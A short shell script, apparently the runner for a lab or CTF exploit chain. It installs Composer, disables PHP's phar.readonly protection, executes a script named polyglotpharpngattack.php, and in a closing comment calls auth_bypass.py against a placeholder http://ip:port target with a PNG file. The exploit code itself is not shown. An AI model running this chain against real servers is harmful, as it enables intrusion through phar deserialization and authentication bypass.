# code /etc/php/7.4/apache2/php.ini
# sudo service apache2 restart
# Path: imagetokattack.sh
#!/bin/sh
# Install dependencies
# sudo apt install wget php-cli php-zip unzip -y \
# wget -O composer-setup.php https://getcomposer.org/installer \
# sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer
# sudo composer self-update # Update composer
composer -V # Check Composer version
# Phar Disabler
# Build the project
sh build_docker.sh
php - m | grep phar
php -r "ini_set('phar.readonly',0);print(ini_get('phar.readonly'));"
# Execute Exploit
php --define phar.readonly=0 polyglotpharpngattack.php # Run the script
php --version && php -m && php -f polyglotpharpngattack.php # Check the script
# sh imagetokattack.sh
# python auth_bypass.py http://ip:port file.png